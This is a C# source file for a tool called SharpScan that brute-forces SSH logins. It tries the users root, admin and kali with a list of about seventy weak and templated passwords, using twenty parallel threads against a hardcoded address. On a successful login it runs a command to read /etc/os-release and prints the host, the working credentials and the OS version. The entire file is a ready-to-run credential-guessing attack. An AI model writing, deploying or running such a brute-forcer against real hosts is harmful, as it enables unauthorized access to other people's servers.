﻿using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Tamir.SharpSsh;

namespace SharpScan
{
    internal class SshBrute
    {
        public static Dictionary<string, List<string>> UserDict = new Dictionary<string, List<string>>
        {
            { "ssh", new List<string> { "root", "admin", "kali" } },
        };

        public static List<string> Passwords = new List<string>
        {
            "123456", "admin", "admin123", "root", "", "pass123", "pass@123", "password", "123123", "654321",
            "111111", "123", "1", "admin@123", "Admin@123", "admin123!@#", "{user}", "{user}1", "{user}111",
            "{user}123", "{user}@123", "{user}_123", "{user}#123", "{user}@111", "{user}@2019", "{user}@123#4",
            "P@ssw0rd!", "P@ssw0rd", "Passw0rd", "qwe123", "12345678", "test", "test123", "123qwe", "123qwe!@#",
            "123456789", "123321", "666666", "a123456.", "123456~a", "123456!a", "000000", "1234567890", "8888888",
            "!QAZ2wsx", "1qaz2wsx", "abc123", "abc123456", "1qaz@WSX", "a11111", "a12345", "Aa1234", "Aa1234.",
            "Aa12345", "a123456", "a123123", "Aa123123", "Aa123456", "Aa12345.", "sysadmin", "system", "1qaz!QAZ",
            "2wsx@WSX", "qwe123!@#", "Aa123456!", "A123456s!", "sa123456", "1q2w3e", "Charge123", "Aa123456789","a","kali"
        };

        private static readonly ConcurrentBag<string> SuccessfulLogins = new ConcurrentBag<string>();
        private static readonly ConcurrentDictionary<string, bool> TriedCombinations = new ConcurrentDictionary<string, bool>();
        private static readonly ConcurrentDictionary<string, bool> SuccessfulCombinations = new ConcurrentDictionary<string, bool>();
        private static readonly SemaphoreSlim semaphore = new SemaphoreSlim(1, 1);
        private static int activeThreads = 0;
        private static readonly int maxDegreeOfParallelism = 20;

        public static void Run(string host)
        {
            int port = 22;
            var cts = new CancellationTokenSource();
            var token = cts.Token;

            foreach (var userPair in UserDict)
            {
                foreach (var user in userPair.Value)
                {
                    foreach (var pass in Passwords)
                    {
                        if (token.IsCancellationRequested)
                        {
                            PrintResults();
                            return;
                        }

                        string comboKey = $"{host}:{port}:{user}:{pass}";

                        if (TriedCombinations.ContainsKey(comboKey))
                        {
                            continue;
                        }

                        TriedCombinations[comboKey] = true;

                        while (true)
                        {
                            if (activeThreads < maxDegreeOfParallelism)
                            {
                                Interlocked.Increment(ref activeThreads);
                                ThreadPool.QueueUserWorkItem(_ => TryLogin(host, port, user, pass, cts, token));
                               // Thread.Sleep(100);
                                break;
                            }
                            Thread.Sleep(100); // 等待，直到有可用的线程池线程
                        }
                    }
                }
            }

            // 等待所有线程完成
            while (activeThreads > 0)
            {
                Thread.Sleep(100);
            }

            PrintResults();
        }

        static async void TryLogin(string host, int port, string username, string password, CancellationTokenSource cts, CancellationToken token)
        {
            try
            {
                if (token.IsCancellationRequested)
                {
                    return;
                }

                using (var client = new TcpClient())
                {
                    try
                    {
                        var result = client.BeginConnect(host, port, null, null);
                        bool success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(1.5));
                        if (!success)
                        {
                            throw new Exception("Connection timed out");
                        }

                        client.EndConnect(result);
                        SshExec exec = new SshExec(host, username, password);
                        exec.Connect();
                        string output = exec.RunCommand("cat /etc/os-release");
                        if (output != null)
                        {
                            string loginInfo = $"[+] (SSH) {host}:{port}  User:{username}  Password:{password}   {ParseOsInfo(output)}";
                            string successKey = $"{username}@{host}:{port}";
                            //Console.WriteLine(loginInfo);
                            await semaphore.WaitAsync();
                            try
                            {
                                if (SuccessfulCombinations.TryAdd(successKey, true))
                                {
                                    
                                    SuccessfulLogins.Add(loginInfo);
                                    cts.Cancel(); // 取消所有任务
                                }
                            }
                            finally
                            {
                                semaphore.Release();
                            }
                        }

                        exec.Close();
                    }
                    catch (Exception ex)
                    {
                        LogException(ex);
                    }
                }
            }
            finally
            {
                Interlocked.Decrement(ref activeThreads);
            }
        }

        static string ParseOsInfo(string output)
        {
            Dictionary<string, string> osInfo = new Dictionary<string, string>();
            Regex regex = new Regex(@"^(\w+)=""?([^""]*)""?$", RegexOptions.Multiline);

            foreach (Match match in regex.Matches(output))
            {
                if (match.Success)
                {
                    string key = match.Groups[1].Value;
                    string value = match.Groups[2].Value;
                    osInfo[key] = value;
                }
            }

            if (osInfo.ContainsKey("NAME") && osInfo.ContainsKey("VERSION"))
            {
                return $"OS: {osInfo["NAME"]}, Version: {osInfo["VERSION"]}";
            }
            else
            {
                return "Unable to determine the operating system version.";
            }
        }

        static void LogException(Exception ex)
        {
            // 这里可以将异常信息记录到日志文件中
            // 例如：
            // File.AppendAllText("error.log", $"{DateTime.Now}: {ex.Message}{Environment.NewLine}");
        }

        static void PrintResults()
        {
            foreach (var login in SuccessfulLogins)
            {
                Console.WriteLine(login);
            }
        }


        static void Main()
        {
            Run("192.168.244.164");
        }
    }
}
